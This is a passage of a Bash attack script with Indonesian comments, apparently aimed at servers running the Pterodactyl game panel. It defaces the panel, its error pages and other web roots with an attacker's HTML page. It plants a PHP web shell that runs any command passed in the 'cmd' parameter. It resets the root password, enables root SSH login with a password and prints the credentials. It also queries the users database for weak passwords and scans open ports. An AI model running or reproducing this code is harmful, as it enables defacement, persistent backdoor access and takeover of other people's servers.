# ==============================================
# FUNGSI DEFACE PANEL PTERODACTYL
# ==============================================
deface_panel() {
    echo -e "\n${RED}${SKULL} MEMULAI DEFACE PANEL PTERODACTYL ${SKULL}${NC}"
    echo -e "${WHITE}‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ${NC}"
    
    # Simpan HTML ke file
    echo "$HTML_DEFACE" > /tmp/deface_r3nndzz.html
    echo -e "${GREEN}${CHECK} HTML deface disiapkan${NC}"
    
    # Cek direktori Pterodactyl
    if [ -d "$PTERO_DIR" ]; then
        echo -e "${YELLOW}${GEAR} Menemukan instalasi Pterodactyl di $PTERO_DIR${NC}"
        
        # Backup file asli
        if [ -f "$PTERO_DIR/public/index.html" ]; then
            cp "$PTERO_DIR/public/index.html" "$PTERO_DIR/public/index.html.bak"
            echo -e "${GREEN}${BACKUP} Backup dibuat: index.html.bak${NC}"
        fi
        
        # Copy file deface
        cp /tmp/deface_r3nndzz.html "$PTERO_DIR/public/index.html" 2>/dev/null
        cp /tmp/deface_r3nndzz.html "$PTERO_DIR/resources/views/templates/index.blade.php" 2>/dev/null
        
        # Ganti juga file error biar kena semua
        if [ -d "$PTERO_DIR/public/errors" ]; then
            cp /tmp/deface_r3nndzz.html "$PTERO_DIR/public/errors/403.html" 2>/dev/null
            cp /tmp/deface_r3nndzz.html "$PTERO_DIR/public/errors/404.html" 2>/dev/null
            cp /tmp/deface_r3nndzz.html "$PTERO_DIR/public/errors/500.html" 2>/dev/null
            cp /tmp/deface_r3nndzz.html "$PTERO_DIR/public/errors/503.html" 2>/dev/null
        fi
        
        echo -e "${GREEN}${CHECK} File Pterodactyl berhasil diganti!${NC}"
    else
        echo -e "${RED}${CROSS} Direktori Pterodactyl tidak ditemukan!${NC}"
    fi
    
    # Cari lokasi website lain
    echo -e "\n${YELLOW}${SCAN} Mencari lokasi website lain...${NC}"
    
    WEB_LOCATIONS=(
        "/var/www/html/index.html"
        "/var/www/html/index.php"
        "/home/*/public_html/index.html"
        "/usr/local/www/index.html"
        "/opt/lampp/htdocs/index.html"
    )
    
    FOUND=0
    for loc in "${WEB_LOCATIONS[@]}"; do
        eval "for f in $loc; do
            if [ -f \"\$f\" ]; then
                cp /tmp/deface_r3nndzz.html \"\$f\" 2>/dev/null
                echo -e \"${GREEN}    ‚úÖ \$f${NC}\"
                ((FOUND++))
            fi
        done" 2>/dev/null
    done
    
    if [ $FOUND -gt 0 ]; then
        echo -e "${GREEN}${CHECK} Berhasil mendeface $FOUND file website${NC}"
    else
        echo -e "${RED}${CROSS} Tidak menemukan file website${NC}"
    fi
    
    # Buat backdoor kecil
    echo -e "\n${YELLOW}${KEY} Membuat backdoor...${NC}"
    BACKDOOR='<?php if(isset($_GET["cmd"])) { echo "<pre>".shell_exec($_GET["cmd"])."</pre>"; } ?>'
    echo "$BACKDOOR" > "$PTERO_DIR/public/shell.php" 2>/dev/null
    echo "$BACKDOOR" > "/var/www/html/shell.php" 2>/dev/null
    echo -e "${GREEN}${CHECK} Backdoor dibuat: shell.php${NC}"
    
    echo -e "\n${GREEN}${CHECK} DEFACE SELESAI! Cek panel di: $URL_PANEL${NC}"
    rm -f /tmp/deface_r3nndzz.html
}

# ==============================================
# FUNGSI GANTI PASSWORD VPS
# ==============================================
change_vps_password() {
    echo -e "\n${RED}${VPS} GANTI PASSWORD VPS ${VPS}${NC}"
    echo -e "${WHITE}‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ${NC}"
    
    echo -ne "${YELLOW}Masukkan password baru untuk VPS: ${NC}"
    read NEW_VPS_PASS
    
    if [ -z "$NEW_VPS_PASS" ]; then
        echo -e "${RED}${CROSS} Password tidak boleh kosong!${NC}"
        return
    fi
    
    # Ganti password root
    echo "root:$NEW_VPS_PASS" | chpasswd 2>/dev/null
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}${CHECK} Password root berubah menjadi: $NEW_VPS_PASS${NC}"
    else
        echo -e "${RED}${CROSS} Gagal ganti password root${NC}"
    fi
    
    # Enable SSH password login
    sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
    sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
    systemctl restart sshd 2>/dev/null || service ssh restart 2>/dev/null
    
    IP_VPS=$(curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
    echo -e "\n${GREEN}INFO LOGIN VPS:${NC}"
    echo -e "  IP: $IP_VPS"
    echo -e "  User: root"
    echo -e "  Pass: $NEW_VPS_PASS"
}

# ==============================================
# FUNGSI SCAN VULNERABILITY
# ==============================================
scan_vulnerability() {
    echo -e "\n${CYAN}${SCAN} SCAN VULNERABILITY ${SCAN}${NC}"
    echo -e "${WHITE}‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ${NC}"
    
    if [ -n "$DB_HOST" ] && [ -n "$DB_USER" ] && [ -n "$DB_PASS" ] && [ -n "$DB_NAME" ]; then
        echo -e "${YELLOW}üîç Testing SQL Injection...${NC}"
        
        # Simple SQL injection test
        TEST=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT 1 FROM users WHERE 1=1 AND 1=1" 2>/dev/null)
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}  ‚úÖ Database vulnerable to basic SQL injection${NC}"
        fi
        
        # Check for weak passwords
        echo -e "\n${YELLOW}üîç Checking for weak passwords...${NC}"
        WEAK_PASS=$(mysql -h "$DB_HOST" -P "$DB_PORT" -u "$DB_USER" -p"$DB_PASS" -D "$DB_NAME" -e "SELECT username FROM users WHERE password IN ('admin', 'password', '123456')" 2>/dev/null)
        if [ -n "$WEAK_PASS" ]; then
            echo -e "${RED}  ‚ö†Ô∏è Found users with weak passwords!${NC}"
            echo "$WEAK_PASS" | while read line; do
                echo "     - $line"
            done
        fi
        
        # Check for outdated version
        echo -e "\n${YELLOW}üîç Checking Pterodactyl version...${NC}"
        if [ -f "$PTERO_DIR/config/app.php" ]; then
            VERSION=$(grep "'version'" "$PTERO_DIR/config/app.php" | cut -d"'" -f4)
            echo -e "${GREEN}  üìå Version: $VERSION${NC}"
        fi
    else
        echo -e "${RED}${CROSS} Database info tidak lengkap untuk scan${NC}"
    fi
    
    # Check open ports
    echo -e "\n${YELLOW}üîç Scanning open ports...${NC}"
    IP_VPS=$(curl -s ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
    for port in 21 22 80 443 3306 8080 8888; do
        timeout 1 bash -c "echo >/dev/tcp/$IP_VPS/$port" 2>/dev/null
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}  ‚úÖ Port $port is open${NC}"
        fi
    done
}

